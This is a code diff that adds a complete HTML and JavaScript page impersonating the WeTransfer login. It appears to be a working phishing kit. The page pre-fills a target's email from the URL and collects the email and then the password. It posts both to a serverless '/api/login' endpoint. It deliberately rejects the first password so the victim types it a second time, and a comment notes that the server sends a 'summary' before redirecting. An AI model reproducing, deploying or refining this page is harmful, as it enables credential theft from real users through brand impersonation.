@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WeTransfer Login</title>
+    <style>
+        /* ====== Your existing CSS (unchanged) ====== */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Helvetica Neue', Arial, sans-serif; }
+        body { display: flex; min-height: 100vh; color: #333; overflow: hidden; }
+        .left-pane { width: 50%; background-color: #f5f5f5; display: flex; flex-direction: column; justify-content: center; padding: 40px; position: relative; }
+        .left-content { max-width: 500px; margin: 0 auto; text-align: center; }
+        .wt-logo { margin-bottom: 40px; width: 120px; }
+        .main-heading { font-size: 36px; font-weight: 300; margin-bottom: 15px; color: #333; line-height: 1.2; }
+        .main-heading strong { font-weight: 700; }
+        .sub-heading { font-size: 18px; font-weight: 300; margin-bottom: 30px; color: #666; }
+        .phone-image { width: 100%; max-width: 400px; margin-left: -50px; }
+        .right-pane { width: 50%; display: flex; justify-content: center; align-items: center; background-color: white; }
+        .login-container { width: 380px; padding: 40px; }
+        .login-logo { text-align: center; margin-bottom: 30px; }
+        .login-logo img { width: 120px; }
+        .form-group { margin-bottom: 20px; position: relative; }
+        .form-group label { display: block; margin-bottom: 8px; font-size: 14px; font-weight: 500; }
+        .form-control { width: 100%; padding: 12px 15px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; transition: border-color 0.3s; padding-left: 40px; }
+        .form-control:focus { outline: none; border-color: #0066ff; }
+        .input-icon { position: absolute; left: 15px; top: 40px; color: #999; }
+        .checkbox-group { display: flex; align-items: center; margin-bottom: 20px; }
+        .checkbox-group input { margin-right: 10px; }
+        .forgot-password { text-align: center; margin: 20px 0; }
+        .forgot-password a { color: #0066ff; text-decoration: none; font-size: 14px; }
+        .btn-login { background-color: #000; color: white; border: none; border-radius: 4px; padding: 14px; width: 100%; font-size: 16px; font-weight: 500; cursor: pointer; display: flex; justify-content: center; align-items: center; transition: background-color 0.3s; }
+        .btn-login:hover { background-color: #333; }
+        .btn-login svg { margin-right: 8px; }
+        .footer { position: absolute; bottom: 20px; left: 0; width: 100%; text-align: center; font-size: 12px; color: #999; }
+        .alert { padding: 12px 15px; border-radius: 4px; margin-bottom: 20px; font-size: 14px; }
+        .alert-error { background-color: #ffebee; color: #c62828; border: 1px solid #ef9a9a; }
+        .alert-success { background-color: #e8f5e9; color: #2e7d32; border: 1px solid #a5d6a7; }
+        #loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(255, 255, 255, 0.8); display: none; justify-content: center; align-items: center; z-index: 1000; }
+        .loading-spinner { border: 5px solid #f3f3f3; border-top: 5px solid #000; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @media (max-width: 768px) { body { flex-direction: column; overflow: auto; } .left-pane, .right-pane { width: 100%; padding: 20px; } .phone-image { margin-left: 0; max-width: 300px; } .login-container { width: 100%; max-width: 380px; } }
+        #small { text-align: left; width: 50px; }
+        .profile-section { text-align: center; padding: 20px 0; border-bottom: 1px solid #eee; }
+        .profile-pic { width: 100px; height: 100px; border-radius: 50%; margin: 0 auto 15px; overflow: hidden; border: 3px solid #764ba2; background: #f0f0f0; display: flex; align-items: center; justify-content: center; }
+        .profile-pic img { width: 100%; height: 100%; object-fit: cover; }
+        .user-email { font-size: 18px; font-weight: 600; color: #333; margin-top: 10px; word-break: break-all; padding: 0 20px; }
+        .welcome-text { font-size: 14px; color: #666; margin-top: 5px; }
+        .input-wrapper { position: relative; }
+        .input-icon { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); color: #999; }
+        .form-group.show-error .form-control { border-color: #c62828; }
+        .shake { animation: shake 0.3s ease-in-out; }
+        @keyframes shake { 0%, 100% { transform: translateX(0); } 20%, 60% { transform: translateX(-10px); } 40%, 80% { transform: translateX(10px); } }
+        .attempt-counter { font-size: 12px; color: #999; margin-top: 5px; }
+        .error-message { color: #c62828; font-size: 13px; margin-top: 5px; }
+    </style>
+</head>
+<body>
+    <div class="left-pane">
+        <div class="left-content">
+            <img class="wt-logo" src="wee.svg" alt="WeTransfer Logo" id="small">
+            <h1 class="main-heading">The simplest way to share <strong>big ideas</strong></h1>
+            <p class="sub-heading">Send files on your terms with WeTransfer</p>
+            <img class="phone-image" src="images/bg.png" alt="Phone with WeTransfer app">
+        </div>
+        <div class="footer"><!-- optional --></div>
+    </div>
+
+    <div class="right-pane">
+        <div class="login-container">
+            <div class="login-logo"><img src="wet.svg" alt="WeTransfer Logo"></div>
+            <div id="alert-container"></div>
+
+            <!-- Step 1: Email -->
+            <div id="step-email">
+                <div class="profile-section">
+                    <div class="profile-pic"><img src="download.png" alt="Profile Picture"></div>
+                    <div class="welcome-text">Enter your email to continue</div>
+                </div>
+                <div class="form-container">
+                    <form id="emailForm">
+                        <div class="form-group">
+                            <div class="input-wrapper">
+                                <span class="input-icon">
+                                    <svg width="16" height="20" viewBox="0 0 16 20" fill="none"><path d="M14 8H13V6C13 3.24 10.76 1 8 1C5.24 1 3 3.24 3 6V8H2C0.9 8 0 8.9 0 10V18C0 19.1 0.9 20 2 20H14C15.1 20 16 19.1 16 18V10C16 8.9 15.1 8 14 8ZM5 6C5 4.34 6.34 3 8 3C9.66 3 11 4.34 11 6V8H5V6ZM14 18H2V10H14V18ZM8 15C9.1 15 10 14.1 10 13C10 11.9 9.1 11 8 11C6.9 11 6 11.9 6 13C6 14.1 6.9 15 8 15Z" fill="#999"/></svg>
+                                </span>
+                                <input type="email" id="email" name="email" class="form-control" placeholder="Enter your email" required autocomplete="email" autofocus>
+                            </div>
+                        </div>
+                        <button type="submit" class="btn-login">
+                            <span><svg aria-hidden="true" width="8" height="12" viewBox="0 0 8 12"><g fill="#FFF"><polygon points="148 33.4 149.4 32 155.4 38 149.4 44 148 42.6 152.6 38"/></g></svg> Continue</span>
+                        </button>
+                    </form>
+                </div>
+            </div>
+
+            <!-- Step 2: Password -->
+            <div id="step-password" style="display:none;">
+                <div class="profile-section">
+                    <div class="profile-pic"><img src="download.png" alt="Profile Picture"></div>
+                    <div id="display-email" class="user-email"></div>
+                    <div class="welcome-text">Welcome back! Please enter your password</div>
+                    <div id="attempt-counter" class="attempt-counter">Attempt 1 of 2</div>
+                </div>
+                <div class="form-container">
+                    <form id="passwordForm">
+                        <div class="form-group" id="password-group">
+                            <div class="input-wrapper">
+                                <span class="input-icon">
+                                    <svg width="16" height="20" viewBox="0 0 16 20" fill="none"><path d="M14 8H13V6C13 3.24 10.76 1 8 1C5.24 1 3 3.24 3 6V8H2C0.9 8 0 8.9 0 10V18C0 19.1 0.9 20 2 20H14C15.1 20 16 19.1 16 18V10C16 8.9 15.1 8 14 8ZM5 6C5 4.34 6.34 3 8 3C9.66 3 11 4.34 11 6V8H5V6ZM14 18H2V10H14V18ZM8 15C9.1 15 10 14.1 10 13C10 11.9 9.1 11 8 11C6.9 11 6 11.9 6 13C6 14.1 6.9 15 8 15Z" fill="#999"/></svg>
+                                </span>
+                                <input type="password" id="password" name="password" class="form-control" placeholder="••••••••" required autocomplete="current-password">
+                            </div>
+                            <div id="password-error" class="error-message" style="display:none;"></div>
+                        </div>
+                        <div class="forgot-password"><a href="#">Forgot password?</a></div>
+                        <div class="checkbox-group"><input type="checkbox" id="remember" name="remember"><label for="remember">Remember me</label></div>
+                        <button type="submit" class="btn-login">
+                            <span><svg aria-hidden="true" width="8" height="12" viewBox="0 0 8 12"><g fill="#FFF"><polygon points="148 33.4 149.4 32 155.4 38 149.4 44 148 42.6 152.6 38"/></g></svg> Log in with WeTransfer</span>
+                        </button>
+                    </form>
+                </div>
+            </div>
+        </div>
+        <div class="footer"><div class="logo">WeTransfer</div><p>Secure file sharing service</p></div>
+    </div>
+
+    <div class="loading-overlay" id="loading-overlay">
+        <div class="spinner"></div>
+        <div class="msg">Processing, please wait...</div>
+    </div>
+
+    <script>
+        const API_URL = '/api/login';  // Your Vercel serverless function
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const emailStep = document.getElementById('step-email');
+            const passwordStep = document.getElementById('step-password');
+            const emailForm = document.getElementById('emailForm');
+            const passwordForm = document.getElementById('passwordForm');
+            const loadingOverlay = document.getElementById('loading-overlay');
+            const alertContainer = document.getElementById('alert-container');
+            const displayEmail = document.getElementById('display-email');
+            const attemptCounter = document.getElementById('attempt-counter');
+            const passwordGroup = document.getElementById('password-group');
+            const passwordError = document.getElementById('password-error');
+
+            let currentEmail = '';
+            let attemptCount = 0;
+
+            function showLoading() { loadingOverlay.style.display = 'flex'; }
+            function hideLoading() { loadingOverlay.style.display = 'none'; }
+
+            function showAlert(msg, type = 'error') {
+                const div = document.createElement('div');
+                div.className = `alert alert-${type}`;
+                div.textContent = msg;
+                alertContainer.appendChild(div);
+                setTimeout(() => div.remove(), 5000);
+            }
+
+            // Extract email from URL (if present)
+            function getEmailFromURL() {
+                const params = new URLSearchParams(window.location.search);
+                return params.get('email') || '';
+            }
+
+            const initialEmail = getEmailFromURL();
+            if (initialEmail) {
+                document.getElementById('email').value = initialEmail;
+            }
+
+            // Email submission
+            emailForm.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                const email = document.getElementById('email').value.trim();
+                if (!email || !email.includes('@')) {
+                    showAlert('Please enter a valid email address.', 'error');
+                    return;
+                }
+
+                showLoading();
+                try {
+                    const res = await fetch(API_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ action: 'email', email })
+                    });
+                    const data = await res.json();
+                    hideLoading();
+                    if (res.ok) {
+                        // Switch to password step
+                        currentEmail = email;
+                        displayEmail.textContent = email;
+                        attemptCount = 0;
+                        attemptCounter.textContent = 'Attempt 1 of 2';
+                        emailStep.style.display = 'none';
+                        passwordStep.style.display = 'block';
+                        document.getElementById('password').focus();
+                    } else {
+                        showAlert(data.error || 'Error submitting email.', 'error');
+                    }
+                } catch (err) {
+                    hideLoading();
+                    showAlert('Network error. Please try again.', 'error');
+                }
+            });
+
+            // Password submission
+            passwordForm.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                const password = document.getElementById('password').value.trim();
+                const remember = document.getElementById('remember').checked ? 1 : 0;
+
+                if (!password) {
+                    passwordError.textContent = 'Please enter your password.';
+                    passwordError.style.display = 'block';
+                    passwordGroup.classList.add('show-error');
+                    return;
+                }
+
+                showLoading();
+                try {
+                    const res = await fetch(API_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            action: 'password',
+                            email: currentEmail,
+                            password,
+                            remember
+                        })
+                    });
+                    const data = await res.json();
+                    hideLoading();
+
+                    if (res.ok && data.redirect) {
+                        // Redirect after second attempt
+                        window.location.href = data.redirect;
+                        return;
+                    } else if (res.status === 401) {
+                        // Incorrect password – increment attempt
+                        attemptCount++;
+                        if (attemptCount >= 2) {
+                            // Second attempt – server should have sent summary and cleared
+                            window.location.href = data.redirect || '/dashboard.html';
+                            return;
+                        }
+                        attemptCounter.textContent = `Attempt ${attemptCount + 1} of 2`;
+                        passwordError.textContent = data.error || 'Incorrect password. Please try again.';
+                        passwordError.style.display = 'block';
+                        passwordGroup.classList.add('show-error');
+                        passwordGroup.classList.add('shake');
+                        setTimeout(() => passwordGroup.classList.remove('shake'), 500);
+                        document.getElementById('password').value = '';
+                        document.getElementById('password').focus();
+                    } else {
+                        showAlert(data.error || 'Unknown error.', 'error');
+                    }
+                } catch (err) {
+                    hideLoading();
+                    showAlert('Network error. Please try again.', 'error');
+                }
+            });
+
+            // Clear error on typing
+            document.getElementById('password').addEventListener('input', function() {
+                passwordError.style.display = 'none';
+                passwordGroup.classList.remove('show-error');
+            });
+        });
+    </script>
+</body>
+</html>
